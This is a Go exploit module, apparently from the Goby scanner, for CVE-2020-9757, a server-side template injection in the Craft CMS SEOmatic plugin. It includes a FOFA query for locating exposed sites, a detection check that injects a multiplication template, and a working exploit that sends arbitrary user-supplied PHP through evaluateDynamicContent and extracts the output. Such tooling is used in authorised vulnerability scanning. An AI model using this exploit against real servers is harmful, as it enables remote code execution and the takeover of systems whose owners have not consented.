package exploits

import (
	"fmt"
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"html"
	"math/rand"
	"net/url"
	"regexp"
	"strconv"
	"strings"
	"time"
)

func init() {
	expJson := `{
    "Name": "CraftCMS SEOmatic component SSTI (CVE-2020-9757)",
    "Description": "The SEOmatic component before 3.3.0 for Craft CMS allows Server-Side Template Injection that leads to RCE via malformed data to the metacontainers controller.",
    "Impact": "CraftCMS SEOmatic component SSTI (CVE-2020-9757)",
    "Recommendation": "<p>1. At present, the manufacturer has released an upgrade patch to fix the vulnerability. For details, please pay attention to the manufacturer's homepage: <a href=\"https://craftcms.com/\">https://craftcms .com/</a></p><p>2. Set access policies through security devices such as firewalls, and set whitelist access to the web system path. </p><p>3. If not necessary, prohibit the public network from accessing this path. </p>",
    "Product": "CraftCMS SEOmatic component",
    "VulType": [
        "Code Execution"
    ],
    "Tags": [
        "Code Execution"
    ],
    "Translation": {
        "CN": {
            "Name": "Craft CMS Seomatic 模板注入漏洞",
            "Description": "Craft CMS是一套内容管理系统（CMS）。Seomatic是其中的一个SEO（搜索引擎优化）组件。Seomatic 3.3.0之前版本（用于Craft CMS）中存在安全漏洞。攻击者可利用该漏洞向服务器端注入模板，获取信息。",
            "Impact": "<p>Craft CMS是一套内容管理系统（CMS）。Seomatic是其中的一个SEO（搜索引擎优化）组件。 Seomatic 3.3.0之前版本（用于Craft CMS）中存在SSTI (服务端模板注入)漏洞，攻击者可利用该漏洞向服务器端注入模板，执行恶意代码，获取服务器权限。</p>",
            "Recommendation": "<p>1、目前厂商已发布升级补丁以修复漏洞，详情请关注厂商主页：<a href=\"https://craftcms.com/\" rel=\"nofollow\">https://craftcms.com/</a></p><p>2、通过防火墙等安全设备设置访问策略，对该web系统路径设置白名单访问。</p><p>3、如非必要，禁止公网访问该路径。</p>",
            "Product": "craf-cms",
            "VulType": [
                "代码执行"
            ],
            "Tags": [
                "代码执行"
            ]
        },
        "EN": {
            "Name": "CraftCMS SEOmatic component SSTI (CVE-2020-9757)",
            "Description": "The SEOmatic component before 3.3.0 for Craft CMS allows Server-Side Template Injection that leads to RCE via malformed data to the metacontainers controller.",
            "Impact": "CraftCMS SEOmatic component SSTI (CVE-2020-9757)",
            "Recommendation": "<p>1. At present, the manufacturer has released an upgrade patch to fix the vulnerability. For details, please pay attention to the manufacturer's homepage: <a href=\"https://craftcms.com/\" rel=\"nofollow\">https://craftcms .com/</a></p><p>2. Set access policies through security devices such as firewalls, and set whitelist access to the web system path. </p><p>3. If not necessary, prohibit the public network from accessing this path. </p>",
            "Product": "CraftCMS SEOmatic component",
            "VulType": [
                "Code Execution"
            ],
            "Tags": [
                "Code Execution"
            ]
        }
    },
    "FofaQuery": "header=\"SEOmatic\" && header=\"Craft CMS\"",
    "GobyQuery": "header=\"SEOmatic\" && header=\"Craft CMS\"",
    "Author": "ovi3",
    "Homepage": "https://github.com/nystudio107/craft-seomatic",
    "DisclosureDate": "2020-03-04",
    "References": [
        "https://github.com/giany/CVE/blob/master/CVE-2020-9757.txt"
    ],
    "HasExp": true,
    "Is0day": false,
    "Level": "3",
    "CVSS": "9.5",
    "CVEIDs": [
        "CVE-2020-9757"
    ],
    "CNVD": [
        "CNVD-2020-15738"
    ],
    "CNNVD": [
        "CNNVD-202003-181"
    ],
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExpParams": [
        {
            "name": "phpcode",
            "type": "input",
            "value": "echo md5(123);",
            "show": ""
        }
    ],
    "ExpTips": {},
    "AttackSurfaces": {
        "Application": [],
        "Support": [],
        "Service": [],
        "System": [],
        "Hardware": []
    },
    "PocId": "10191"
}`

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, u *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
			rand.Seed(time.Now().UnixNano())
			rand1 := 40000 + rand.Intn(4800)
			rand2 := 40000 + rand.Intn(4800)
			injectData := fmt.Sprintf(`{{%d*%d}}`, rand1, rand2)
			if resp, err := httpclient.SimpleGet(u.FixedHostInfo + "/actions/seomatic/meta-container/meta-link-container/?uri=" + url.QueryEscape(injectData)); err == nil {
				if resp.StatusCode == 200 && strings.Contains(resp.RawBody, "MetaLinkContainer") && strings.Contains(resp.RawBody, "canonical") && strings.Contains(resp.RawBody, strconv.Itoa(rand1*rand2)) {
					return true
				}
			}
			return false
		},
		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			phpCode := ss.Params["phpcode"].(string)
			phpCode = strings.ReplaceAll(phpCode, `\`, `\\`)
			phpCode = strings.ReplaceAll(phpCode, `'`, `\'`)
			injectData := fmt.Sprintf(`{{craft.app.view.evaluateDynamicContent('print(13371337);%s;print(73317331);')}}`, phpCode)
			if resp, err := httpclient.SimpleGet(expResult.HostInfo.FixedHostInfo + "/actions/seomatic/meta-container/meta-link-container/?uri=" + url.QueryEscape(injectData)); err == nil {
				if resp.StatusCode == 200 && strings.Contains(resp.RawBody, "MetaLinkContainer") && strings.Contains(resp.RawBody, "canonical") {
					expResult.Success = true
					m := regexp.MustCompile(`13371337(.*?)73317331\\"`).FindStringSubmatch(resp.RawBody)
					if m != nil {
						expResult.Output = html.UnescapeString(strings.ReplaceAll(m[1], `\n`, "\n"))
					} else {
						expResult.Output = resp.RawBody
					}
				}
			}
			return expResult
		},
	))
}
